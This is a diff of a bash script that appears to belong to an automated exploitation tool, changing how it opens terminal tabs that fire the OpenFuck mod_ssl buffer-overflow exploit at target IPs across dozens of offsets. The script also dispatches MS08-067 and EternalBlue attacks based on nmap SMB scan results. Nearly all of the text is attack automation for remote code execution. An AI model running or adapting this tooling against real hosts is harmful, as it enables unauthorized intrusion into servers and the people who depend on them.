 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1414,7 +1437,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x48 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x48 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1438,14 +1461,14 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x44 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x45 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x46 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x56 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x57 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x58 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5e ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5f ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x44 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x45 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x46 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x56 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x57 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x58 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5e ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5f ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1476,8 +1499,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6b ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6a ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6b ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6a ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1502,12 +1525,12 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6c ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x61 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x62 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x66 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x67 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x68 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6c ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x61 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x62 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x66 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x67 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x68 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1536,11 +1559,11 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x73 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x59 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5a ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5b ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x74 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x73 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x59 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5a ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5b ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x74 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1568,8 +1591,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x50 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x53 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x50 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x53 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1595,8 +1618,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x64 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x65 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x64 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x65 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1622,8 +1645,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6d ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x51 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6d ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x51 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1649,7 +1672,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x78 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x78 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1674,12 +1697,12 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6e ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x6f ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x70 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x71 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x55 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5c ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6e ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x6f ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x70 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x71 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x55 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5c ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1709,13 +1732,13 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x72 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x75 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x76 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x77 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x5d ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x63 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x69 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x72 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x75 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x76 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x77 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x5d ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x63 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x69 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1761,7 +1784,7 @@ do
 							ms08_067_netapi
 						elif [ "${smbvulnID}" = "ms17-010" ] || [ "${smbvulnID}" = "MS17-010" ]
 						then
-							ms17_010_eternalblue
+							ms17_010_eternalblues
 						fi
 				    done <${ips}/nmapSMBVuln.txt
 				fi
